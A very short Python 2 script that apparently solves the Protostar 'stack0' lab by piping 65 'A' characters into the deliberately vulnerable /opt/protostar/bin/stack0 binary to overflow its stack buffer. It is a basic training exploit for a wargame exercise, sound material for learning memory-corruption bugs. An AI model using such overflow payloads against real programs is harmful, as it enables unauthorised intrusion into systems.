#!/usr/bin/python

import os
import struct

payload =  "A" * 0x41

print payload


os.system("echo \"%s\" | /opt/protostar/bin/stack0" % payload)
